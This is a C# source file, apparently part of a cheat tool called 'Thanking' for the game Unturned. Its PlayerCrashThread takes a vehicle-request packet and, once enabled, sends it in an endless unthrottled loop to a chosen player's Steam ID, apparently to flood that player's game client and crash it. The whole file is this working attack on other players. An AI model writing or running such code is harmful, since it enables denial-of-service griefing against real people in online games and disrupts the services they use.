﻿using System.Linq;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool PlayerCrashEnabled;
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif

            SteamChannel channel = VehicleManager.instance.channel;
            
            int call = channel.getCall("askVehicles");
            channel.getPacket(ESteamPacket.UPDATE_RELIABLE_INSTANT, call, out var size, out var packet);
            
            Provider.onClientDisconnected += OnDisconnect;

            while (true)
            {
                if (PlayerCrashEnabled)
                    Provider.send(CrashTarget, ESteamPacket.UPDATE_RELIABLE_INSTANT, packet, size, 0);
            }
        }

        public static void OnDisconnect() =>
            PlayerCrashEnabled = false;
    }
}
